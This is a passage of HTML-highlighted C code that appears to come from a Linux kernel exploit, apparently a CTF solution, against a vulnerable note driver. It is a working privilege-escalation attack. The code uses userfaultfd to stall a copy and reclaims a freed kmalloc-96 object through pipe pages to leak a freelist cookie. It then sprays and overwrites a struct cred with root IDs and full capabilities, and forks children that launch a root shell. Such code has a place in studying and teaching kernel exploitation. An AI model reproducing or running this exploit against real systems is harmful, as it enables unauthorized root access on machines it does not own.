        <span class="p">.</span><span class="n">addr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">data</span><span class="p">,</span>
    <span class="p">};</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">ioctl</span><span class="p">(</span><span class="n">note_fd</span><span class="p">,</span> <span class="n">IO_EDIT</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">arg</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">fatal</span><span class="p">(</span><span class="s">"edit"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">note_show</span><span class="p">(</span><span class="kt">int</span> <span class="n">idx</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">struct</span> <span class="n">ioctl_arg</span> <span class="n">arg</span> <span class="o">=</span> <span class="p">{</span>
        <span class="p">.</span><span class="n">idx</span> <span class="o">=</span> <span class="n">idx</span><span class="p">,</span>
        <span class="p">.</span><span class="n">addr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">data</span><span class="p">,</span>
    <span class="p">};</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">ioctl</span><span class="p">(</span><span class="n">note_fd</span><span class="p">,</span> <span class="n">IO_SHOW</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">arg</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">fatal</span><span class="p">(</span><span class="s">"show"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">note_del</span><span class="p">(</span><span class="kt">int</span> <span class="n">idx</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">struct</span> <span class="n">ioctl_arg</span> <span class="n">arg</span> <span class="o">=</span> <span class="p">{</span>
        <span class="p">.</span><span class="n">idx</span> <span class="o">=</span> <span class="n">idx</span><span class="p">,</span>
    <span class="p">};</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">ioctl</span><span class="p">(</span><span class="n">note_fd</span><span class="p">,</span> <span class="n">IO_DEL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">arg</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">fatal</span><span class="p">(</span><span class="s">"del"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="o">*</span><span class="nf">thread_note_edit</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">addr</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">pin_cpu</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">note_edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">addr</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"[+] note_edit() succeeded"</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">int</span> <span class="nf">ufd_unblock_page_copy</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">unblock_page</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">content_page</span><span class="p">,</span> <span class="kt">size_t</span> <span class="o">*</span><span class="n">copy_out</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">struct</span> <span class="n">uffdio_copy</span> <span class="n">copy</span> <span class="o">=</span> <span class="p">{</span>
        <span class="p">.</span><span class="n">dst</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uintptr_t</span><span class="p">)</span><span class="n">unblock_page</span><span class="p">,</span>
        <span class="p">.</span><span class="n">src</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uintptr_t</span><span class="p">)</span><span class="n">content_page</span><span class="p">,</span>
        <span class="p">.</span><span class="n">len</span> <span class="o">=</span> <span class="mh">0x1000</span><span class="p">,</span>
        <span class="p">.</span><span class="n">copy</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uintptr_t</span><span class="p">)</span><span class="n">copy_out</span><span class="p">,</span>
        <span class="p">.</span><span class="n">mode</span> <span class="o">=</span> <span class="mi">0</span><span class="p">};</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"unblocking %p (copying 0x1000 bytes from %p)"</span><span class="p">,</span> <span class="n">unblock_page</span><span class="p">,</span> <span class="n">content_page</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">ioctl</span><span class="p">(</span><span class="n">userfault_fd</span><span class="p">,</span> <span class="n">UFFDIO_COPY</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">copy</span><span class="p">))</span>
        <span class="n">fatal</span><span class="p">(</span><span class="s">"UFFDIO_COPY failed"</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">int</span> <span class="nf">sys_io_uring_setup</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">entries</span><span class="p">,</span> <span class="k">struct</span> <span class="n">io_uring_params</span> <span class="o">*</span><span class="n">p</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">return</span> <span class="n">syscall</span><span class="p">(</span><span class="n">__NR_io_uring_setup</span><span class="p">,</span> <span class="n">entries</span><span class="p">,</span> <span class="n">p</span><span class="p">);</span>
<span class="p">}</span>


<span class="k">static</span> <span class="kt">int</span> <span class="nf">uring_create</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">n_sqe</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">n_cqe</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">struct</span> <span class="n">io_uring_params</span> <span class="n">p</span> <span class="o">=</span> <span class="p">{</span>
        <span class="p">.</span><span class="n">cq_entries</span> <span class="o">=</span> <span class="n">n_cqe</span><span class="p">,</span>
        <span class="p">.</span><span class="n">flags</span> <span class="o">=</span> <span class="n">IORING_SETUP_CQSIZE</span>
    <span class="p">};</span>

    <span class="kt">int</span> <span class="n">res</span> <span class="o">=</span> <span class="n">sys_io_uring_setup</span><span class="p">(</span><span class="n">n_sqe</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">p</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">res</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
        <span class="n">fatal</span><span class="p">(</span><span class="s">"io_uring_setup() failed"</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">res</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">int</span> <span class="nf">alloc_n_creds</span><span class="p">(</span><span class="kt">int</span> <span class="n">uring_fd</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">n_creds</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">n_creds</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">struct</span> <span class="n">__user_cap_header_struct</span> <span class="n">cap_hdr</span> <span class="o">=</span> <span class="p">{</span>
            <span class="p">.</span><span class="n">pid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
            <span class="p">.</span><span class="n">version</span> <span class="o">=</span> <span class="n">_LINUX_CAPABILITY_VERSION_3</span>
        <span class="p">};</span>

        <span class="k">struct</span> <span class="n">user_cap_data_struct</span> <span class="n">cap_data</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
            <span class="p">{.</span><span class="n">effective</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="p">.</span><span class="n">inheritable</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="p">.</span><span class="n">permitted</span> <span class="o">=</span> <span class="mi">0</span><span class="p">},</span>
            <span class="p">{.</span><span class="n">effective</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="p">.</span><span class="n">inheritable</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="p">.</span><span class="n">permitted</span> <span class="o">=</span> <span class="mi">0</span><span class="p">}</span>
        <span class="p">};</span>

        <span class="cm">/* allocate new cred */</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">syscall</span><span class="p">(</span><span class="n">SYS_capset</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cap_hdr</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">cap_data</span><span class="p">))</span>
            <span class="n">fatal</span><span class="p">(</span><span class="s">"capset() failed"</span><span class="p">);</span>

        <span class="cm">/* increment refcount so we don't free it afterwards*/</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">syscall</span><span class="p">(</span><span class="n">SYS_io_uring_register</span><span class="p">,</span> <span class="n">uring_fd</span><span class="p">,</span> <span class="n">IORING_REGISTER_PERSONALITY</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
            <span class="n">fatal</span><span class="p">(</span><span class="s">"io_uring_register() failed"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="o">*</span><span class="nf">userfault_thread</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">arg</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">struct</span> <span class="n">uffd_msg</span> <span class="n">blockers</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
    <span class="k">struct</span> <span class="n">uffd_msg</span> <span class="n">msg</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">uffdio_copy</span> <span class="n">copy</span><span class="p">;</span>

    <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">scratch</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_ANONYMOUS</span> <span class="o">|</span> <span class="n">MAP_PRIVATE</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

    <span class="n">pin_cpu</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>

    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="n">userfault_fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">msg</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">msg</span><span class="p">))</span> <span class="o">!=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">msg</span><span class="p">))</span>
        <span class="p">{</span>
            <span class="n">fatal</span><span class="p">(</span><span class="s">"userfault read"</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">event</span> <span class="o">!=</span> <span class="n">UFFD_EVENT_PAGEFAULT</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">fatal</span><span class="p">(</span><span class="s">"unexpected uffd event"</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="n">printf</span><span class="p">(</span><span class="s">"[+] got userfault block %ld (addr %.16llx)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">msg</span><span class="p">.</span><span class="n">arg</span><span class="p">.</span><span class="n">pagefault</span><span class="p">.</span><span class="n">address</span><span class="p">);</span>
        <span class="n">blockers</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">msg</span><span class="p">;</span>
    <span class="p">}</span>


    <span class="k">struct</span> <span class="n">pipe_pair</span> <span class="n">pipes</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">ARRAY_SIZE</span><span class="p">(</span><span class="n">pipes</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
        <span class="n">pipe</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">__raw</span><span class="p">);</span>

    <span class="kt">int</span> <span class="n">uring_cred_dumps</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="n">uring_create</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">),</span> <span class="n">uring_create</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)};</span>

    <span class="n">cc_next</span><span class="p">(</span><span class="n">kmalloc96_cc</span><span class="p">);</span> <span class="cm">/* free surrounding objects*/</span>
    <span class="n">cc_next</span><span class="p">(</span><span class="n">kmalloc96_cc</span><span class="p">);</span> <span class="cm">/* fill up partial lists */</span>

    <span class="cm">/* sleep for rcu*/</span>
    <span class="n">usleep</span><span class="p">(</span><span class="mi">200000</span><span class="p">);</span>

    <span class="n">note_del</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">note_add</span><span class="p">(</span><span class="s">"aaa"</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>

    <span class="cm">/* Reallocate freed kmalloc-96 slab as a pipe page. */</span>
    <span class="kt">uint64_t</span> <span class="n">dummy_buf</span><span class="p">[</span><span class="mh">0x1000</span> <span class="o">/</span> <span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="p">{};</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">ARRAY_SIZE</span><span class="p">(</span><span class="n">pipes</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">write</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">write</span><span class="p">,</span> <span class="n">dummy_buf</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
            <span class="n">fatal</span><span class="p">(</span><span class="s">"write() to pipe failed"</span><span class="p">);</span>

    <span class="cm">/* unblock to trigger memcpy(). */</span>
    <span class="kt">size_t</span> <span class="n">copied_size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">ufd_unblock_page_copy</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">blockers</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">arg</span><span class="p">.</span><span class="n">pagefault</span><span class="p">.</span><span class="n">address</span><span class="p">,</span> <span class="n">scratch</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">copied_size</span><span class="p">);</span>

    <span class="n">usleep</span><span class="p">(</span><span class="mi">200000</span><span class="p">);</span>
    <span class="kt">uint64_t</span> <span class="n">cookie</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">cookie_idx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">pipe_idx</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">pipe_idx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">pipe_idx</span> <span class="o">&lt;</span> <span class="n">ARRAY_SIZE</span><span class="p">(</span><span class="n">pipes</span><span class="p">);</span> <span class="n">pipe_idx</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="cm">/* kmalloc-96 is not naturally aligned to PAGESIZE, so we can read this all without worrying
         * about prematurely freeing our page. */</span>
        <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">42</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="kt">uint64_t</span> <span class="n">chunk</span><span class="p">[</span><span class="mh">0x0c</span><span class="p">];</span>

            <span class="k">if</span> <span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="n">pipe_idx</span><span class="p">].</span><span class="n">read</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">chunk</span><span class="p">,</span> <span class="mi">96</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
                <span class="n">fatal</span><span class="p">(</span><span class="s">"read() from pipe failed"</span><span class="p">);</span>

            <span class="kt">uint64_t</span> <span class="n">potential_cookie</span> <span class="o">=</span> <span class="n">chunk</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>

            <span class="n">printf</span><span class="p">(</span><span class="s">"%.16lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">potential_cookie</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">cookie</span> <span class="o">&amp;&amp;</span> <span class="n">potential_cookie</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">cookie</span> <span class="o">=</span> <span class="n">potential_cookie</span><span class="p">;</span>
                <span class="n">cookie_idx</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">cookie</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">cookie</span><span class="p">)</span> <span class="p">{</span>

        <span class="cm">/* If we didn't land on a cred boundary, bail out. We'd crash anyway. */</span>
        <span class="k">if</span> <span class="p">((</span><span class="n">cookie_idx</span> <span class="o">*</span> <span class="mi">96</span><span class="p">)</span> <span class="o">%</span> <span class="mi">192</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="cm">/* make the memcpy() just write into our controlled pipe page again, so no harm is done. */</span>
            <span class="n">ufd_unblock_page_copy</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">blockers</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">arg</span><span class="p">.</span><span class="n">pagefault</span><span class="p">.</span><span class="n">address</span><span class="p">,</span> <span class="n">scratch</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">copied_size</span><span class="p">);</span>
            <span class="n">fatal</span><span class="p">(</span><span class="s">"UaF object was not aligned to 192 bytes. Try again.."</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="cm">/* Before releasing the page again, we empty the cred freelist 
         * so any new cred allocations will get a new slab */</span>
        <span class="n">alloc_n_creds</span><span class="p">(</span><span class="n">uring_cred_dumps</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mh">0x4000</span><span class="p">);</span>

        <span class="cm">/* Release page*/</span>
        <span class="n">close</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="n">pipe_idx</span><span class="p">].</span><span class="n">read</span><span class="p">);</span>
        <span class="n">close</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="n">pipe_idx</span><span class="p">].</span><span class="n">write</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="cm">/* this error path is a bit problematic, we don't know where the write went.. 
         * still, it's better to get the other write over with now.
        */</span>
        <span class="n">ufd_unblock_page_copy</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">blockers</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">arg</span><span class="p">.</span><span class="n">pagefault</span><span class="p">.</span><span class="n">address</span><span class="p">,</span> <span class="n">scratch</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">copied_size</span><span class="p">);</span>
        <span class="n">fatal</span><span class="p">(</span><span class="s">"cross-cache failed. Try again.."</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"pipe %ld, offset +0x%.4lx: cookie %.16lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pipe_idx</span><span class="p">,</span> <span class="n">cookie_idx</span> <span class="o">*</span> <span class="mi">96</span><span class="p">,</span> <span class="n">cookie</span><span class="p">);</span>

    <span class="cm">/* Pre-allocate struct creds to reclaim the page. 
     * Free them immediately afterwards so we can reallocate them for tasks. */</span>
    <span class="n">alloc_n_creds</span><span class="p">(</span><span class="n">uring_cred_dumps</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">32</span><span class="p">);</span>
    <span class="n">close</span><span class="p">(</span><span class="n">uring_cred_dumps</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>

    <span class="cm">/* wait for rcu to finish so creds are actually freed. */</span>
    <span class="n">usleep</span><span class="p">(</span><span class="mi">200000</span><span class="p">);</span>

    <span class="k">struct</span> <span class="n">pipe_pair</span> <span class="n">child_comm</span><span class="p">;</span>
    <span class="n">pipe</span><span class="p">(</span><span class="n">child_comm</span><span class="p">.</span><span class="n">__raw</span><span class="p">);</span>

    <span class="cm">/* realloc creds, now belong to child tasks */</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">32</span> <span class="o">*</span> <span class="mi">2</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        
        <span class="k">if</span> <span class="p">(</span><span class="n">fork</span><span class="p">())</span>
            <span class="k">continue</span><span class="p">;</span>
        
        <span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
        <span class="n">uid_t</span> <span class="n">uid</span> <span class="o">=</span> <span class="n">getuid</span><span class="p">();</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"uid: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">uid</span><span class="p">)</span> <span class="p">{</span>
            <span class="kt">char</span> <span class="n">dummy</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
            <span class="n">write</span><span class="p">(</span><span class="n">child_comm</span><span class="p">.</span><span class="n">write</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dummy</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">dummy</span><span class="p">);</span>
            <span class="n">system</span><span class="p">(</span><span class="s">"sh"</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
        
    <span class="p">}</span>

    <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>

    <span class="k">struct</span> <span class="n">kernel_cred</span> <span class="o">*</span><span class="n">cred</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">scratch</span><span class="p">;</span>

    <span class="n">cred</span><span class="o">-&gt;</span><span class="n">usage</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">cred</span><span class="o">-&gt;</span><span class="n">uid</span> <span class="o">=</span> <span class="n">cred</span><span class="o">-&gt;</span><span class="n">euid</span> <span class="o">=</span> <span class="n">cred</span><span class="o">-&gt;</span><span class="n">fsuid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">cred</span><span class="o">-&gt;</span><span class="n">gid</span> <span class="o">=</span> <span class="n">cred</span><span class="o">-&gt;</span><span class="n">egid</span> <span class="o">=</span> <span class="n">cred</span><span class="o">-&gt;</span><span class="n">fsgid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">cred</span><span class="o">-&gt;</span><span class="n">securebits</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="cm">/* SECUREBITS_DEFAULT */</span>
    <span class="n">cred</span><span class="o">-&gt;</span><span class="n">cap_effective</span> <span class="o">=</span> <span class="n">cred</span><span class="o">-&gt;</span><span class="n">cap_permitted</span> <span class="o">=</span> <span class="n">cred</span><span class="o">-&gt;</span><span class="n">cap_inheritable</span> <span class="o">=</span> <span class="n">cred</span><span class="o">-&gt;</span><span class="n">cap_bset</span> <span class="o">=</span> <span class="mh">0x1fffffffful</span><span class="p">;</span>
    <span class="n">cred</span><span class="o">-&gt;</span><span class="n">cap_ambient</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">96</span> <span class="o">/</span> <span class="mi">8</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
        <span class="n">scratch</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">cookie</span><span class="p">;</span>

    <span class="n">ufd_unblock_page_copy</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">blockers</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">arg</span><span class="p">.</span><span class="n">pagefault</span><span class="p">.</span><span class="n">address</span><span class="p">,</span> <span class="n">scratch</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">copied_size</span><span class="p">);</span>

    <span class="k">struct</span> <span class="n">pollfd</span> <span class="n">poller</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="p">{.</span><span class="n">events</span> <span class="o">=</span> <span class="n">POLLIN</span><span class="p">,</span> <span class="p">.</span><span class="n">fd</span> <span class="o">=</span> <span class="n">child_comm</span><span class="p">.</span><span class="n">read</span><span class="p">}};</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">poll</span><span class="p">(</span><span class="n">poller</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">3000</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span>
        <span class="n">fatal</span><span class="p">(</span><span class="s">"Could not overwrite struct cred. Try again.."</span><span class="p">);</span>

    <span class="n">sleep</span><span class="p">(</span><span class="mi">10000</span><span class="p">);</span>
    <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// Initialize userfaultfd. Must call this before using the other userfault_*</span>
<span class="c1">// functions.</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">userfaultfd_init</span><span class="p">()</span>
<span class="p">{</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">userfault_fd</span> <span class="o">=</span> <span class="n">syscall</span><span class="p">(</span><span class="n">SYS_userfaultfd</span><span class="p">,</span> <span class="n">O_CLOEXEC</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">userfault_fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">fatal</span><span class="p">(</span><span class="s">"userfaultfd"</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="n">userfault_page</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_ANONYMOUS</span> <span class="o">|</span> <span class="n">MAP_PRIVATE</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">userfault_page</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">fatal</span><span class="p">(</span><span class="s">"mmap userfaultfd"</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="c1">// Enable userfaultfd</span>
        <span class="k">struct</span> <span class="n">uffdio_api</span> <span class="n">api</span> <span class="o">=</span> <span class="p">{</span>
            <span class="p">.</span><span class="n">api</span> <span class="o">=</span> <span class="n">UFFD_API</span><span class="p">,</span>
            <span class="p">.</span><span class="n">features</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
        <span class="p">};</span>
